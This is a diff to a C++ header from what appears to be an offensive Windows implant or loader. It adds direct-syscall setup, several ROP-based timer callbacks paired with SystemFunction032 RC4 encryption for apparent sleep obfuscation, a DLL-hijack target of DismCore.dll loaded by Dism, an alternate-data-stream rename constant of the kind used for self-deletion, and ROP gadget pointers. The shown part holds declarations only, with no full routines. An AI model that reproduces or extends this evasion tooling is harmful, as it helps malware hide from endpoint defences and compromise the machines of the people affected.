@@ -1,6 +1,12 @@
 #pragma once
+#pragma comment(lib, "Shlwapi.lib")
+
 #include <windows.h>
+#include <shlwapi.h>
 #include <string>
+#include <syscall.hpp>
+#include <algorithm>
+#include <versionhelpers.h>
 
 // Custom libs
 #include "CContextHook.hpp"
@@ -10,6 +16,9 @@
 #include "Route.hpp"
 #include "Refresh.hpp" // Better to use FreshyCalls eventually and do dynmically resolved syscalls
 #include "Sleep.hpp"
+
+#define DS_STREAM_RENAME L":vnqifa"
+static auto& syscall = freshycalls::Syscall::get_instance();
 
 // Setup structs
 typedef struct _CRYPT_BUFFER {
@@ -105,7 +114,13 @@ RtlCreateUserThread_t RtlCreateUserThread;
 
 // Functions
 extern "C" VOID CALLBACK freeRop(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue);
+extern "C" VOID CALLBACK freeRopV3(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue);
+extern "C" VOID CALLBACK freeRopV4(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue);
+extern "C" VOID CALLBACK freeRopV5(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue);
 extern "C" VOID CALLBACK cryptor(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue);
+extern "C" VOID CALLBACK cryptorV3(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue);
+extern "C" VOID CALLBACK cryptorV4(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue);
+extern "C" VOID CALLBACK cryptorV5(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue);
 typedef NTSTATUS(WINAPI* SystemFunction032_t)(IN OUT PCRYPT_BUFFER pData, IN PDATA_KEY pKey);
 SystemFunction032_t SystemFunction032 = NULL;
 typedef NTSTATUS(WINAPI* SystemFunction033_t)(IN OUT PCRYPT_BUFFER pData, IN PDATA_KEY pKey);
@@ -117,11 +132,13 @@ NtTestAlert_t NtTestAlert = NULL;
 #if defined(RELEASE_DLL) || defined(DEBUG_DLL)
 // User Assigned for DLL Hijacks
 std::string procNameHijack = "Dism";
+std::string dllNameHijack = "DismCore.dll";
 #endif
 // Base Configuration
 SetupConfiguration config;
 // Custom Heap
-HANDLE myHeap = HeapCreate(NULL, NULL, NULL);
+extern HANDLE myHeap;
+extern HANDLE mainHeap;
 // Our Gadget Locations
 LPVOID gadget = 0;
 LPVOID jmp_rbx_0 = 0;
@@ -140,3 +157,7 @@ static size_t keySize = 4096;
 HANDLE ghMutex;
 // Exit Process Cleanup Point
 LPVOID dllOffloadEntryPoint = NULL;
+// Do we need padding for our ropchain var
+int pad = 1;
+// Load Module for RopChain
+HMODULE loadDll = NULL;
